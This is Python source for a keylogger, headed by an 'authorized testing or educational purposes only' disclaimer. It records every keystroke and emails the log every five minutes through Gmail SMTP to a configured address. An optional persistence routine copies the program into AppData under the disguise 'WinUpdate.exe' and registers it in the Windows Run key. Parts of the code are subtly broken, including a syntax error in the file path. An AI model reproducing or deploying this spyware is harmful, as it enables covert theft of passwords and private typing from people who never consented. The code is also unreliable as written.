"""
------------------Keylogger-------------------

This program should be used for authorized testing or educational purposes only.
We are not responsible for any illegal usage of this program.

-----------------------------------------------

"""
import pynput.keyboard
import smtplib
import threading
import subprocess
import os
import shutil
import sys
import time 
import random

SMTP_ADDR = "smtp.gmail.com"  # SMTP SERVER 
SMTP_PORT = 587
EMAIL = "example@example.com"  #ALL DATA WILL SEND TO THIS E-MAIL
PASSWORD = ""  # E MAIL PASSWORD
MAIL_INTERVAL = 300 #seconds
HIDE_SPECIAL_KEYS = True #Hide special keys like Shift-Backspace from email data
PERSISTANCE = False # This function is not stable. But generally works

REG_EDIT_RUN_COMMAND = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {} /t REG_SZ /d "

log=""
def call_back(key):
    global log
    try:
        log = log + key.char.encode("utf-8")

        
    except AttributeError:
        
        if key == key.space:
            log = log + " "
        else:
            if HIDE_SPECIAL_KEYS:
                pass
            else:        
                log = log+str(key)
            
        
    print(log)
def permanent_migration():    #For persistance
    new_dir = os.environ["appdata"] + "\\"+"WinUpdate"+.exe"
    shutil.copyfile(sys.executable,new_dir)
    new_dir= REG_EDIT_RUN_COMMAND.format(random.randint(1,100000000))+new_dir
    subprocess.call(new_dir,shell=True)
   
       
    
def send_mail(email,password,message):
    
    server = smtplib.SMTP(SMTP_ADDR,SMTP_PORT)
    server.starttls()
    server.login(email,password)

    server.sendmail(email,email,message)
    server.quit()
    


def thread_sender():
   
    global log
    
    send_mail(EMAIL,PASSWORD,log)
    log = ""
    timer = threading.Timer(MAIL_INTERVAL,thread_sender)
    timer.start()
      

key_listener = pynput.keyboard.Listener(on_press=call_back)

while True:
    try:
        with key_listener:
            if PERSISTANCE:
                permanent_migration()
            thread_sender()
            key_listener.join()
           
    except:
        print("Waiting...")
        time.sleep(60)        

    
